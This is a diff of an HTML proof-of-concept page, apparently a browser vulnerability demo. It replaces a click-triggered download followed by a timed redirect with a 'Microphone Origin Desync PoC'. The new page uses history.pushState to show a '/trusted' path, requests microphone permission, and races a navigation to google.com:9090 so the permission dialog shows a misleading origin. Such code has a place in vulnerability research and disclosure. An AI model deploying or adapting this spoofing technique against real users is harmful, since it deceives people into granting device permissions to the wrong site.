@@ -1,67 +1,109 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Instruction Page</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      margin: 0;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-family: system-ui, sans-serif;
-      background: #f6f6f6;
-      cursor: pointer;
-      user-select: none;
-    }
-    h1 {
-      max-width: 420px;
-      text-align: center;
-      color: #222;
-      padding: 20px;
-      line-height: 1.4;
-    }
-  </style>
+<meta charset="utf-8">
+<title>Microphone Origin Desync PoC</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+body {
+  margin: 0;
+  font-family: -apple-system, BlinkMacSystemFont, system-ui;
+  background: #f5f5f7;
+}
+
+button {
+  font-size: 15px;
+  padding: 10px 14px;
+  border-radius: 10px;
+  border: none;
+  background: #007aff;
+  color: #fff;
+}
+
+#panel {
+  display: none;
+  max-width: 420px;
+  margin: 80px auto;
+  background: #fff;
+  padding: 24px;
+  border-radius: 16px;
+  box-shadow: 0 20px 60px rgba(0,0,0,.2);
+  text-align: center;
+}
+
+.notice {
+  margin-top: 14px;
+  font-size: 13px;
+  color: #b00020;
+}
+</style>
 </head>
+
 <body>
-  <h1>
-    Please follow the instruction.<br>
-    Tap anywhere to continue.
-  </h1>
 
-  <script>
-    function triggerDownload() {
-      const content = 'Demo file generated after a single user interaction.';
-      const blob = new Blob([content], { type: 'text/plain' });
-      const url = URL.createObjectURL(blob);
+<div style="text-align:center; margin-top:60px;">
+  <button id="trigger">Start PoC</button>
+</div>
 
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = 'result.zip';
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
+<div id="panel">
+  <h2>Request Microphone</h2>
+  <p>Tap the button below to request microphone permission.</p>
 
-      URL.revokeObjectURL(url);
-    }
+  <button onclick="getMic()">Enable Microphone</button>
+  <p id="output">Microphone: -</p>
 
-    document.addEventListener(
-      'click',
-      () => {
-        // Step 1: Download happens
-        triggerDownload();
+  <div class="notice">
+    Demo only — observe origin shown in permission dialog
+  </div>
+</div>
 
-        // Step 2: Delayed redirect
-        setTimeout(() => {
-          location.href = 'https://www.google.com:9090';
-        }, 190);
-      },
-      { once: true }
-    );
-  </script>
+<script>
+const panel   = document.getElementById('panel');
+const trigger = document.getElementById('trigger');
+const output  = document.getElementById('output');
+
+function getMic() {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    output.textContent = 'getUserMedia not supported';
+    return;
+  }
+
+  navigator.mediaDevices.getUserMedia({ audio: true })
+    .then(stream => {
+      output.textContent = 'Microphone access granted';
+
+      // stop immediately (no actual recording)
+      stream.getTracks().forEach(t => t.stop());
+    })
+    .catch(err => {
+      output.textContent = 'Permission denied';
+    });
+}
+
+/*
+ * Step 1:
+ * Manipulate visible URL to a trusted-looking path
+ */
+trigger.onclick = () => {
+  history.pushState({}, '', '/trusted');
+  panel.style.display = 'block';
+};
+
+/*
+ * Step 2:
+ * Trigger a navigation race shortly after permission flow starts
+ */
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        location.href = 'https://google.com:9090';
+      }, 80);
+    });
+  });
+});
+</script>
+
 </body>
 </html>
-
-
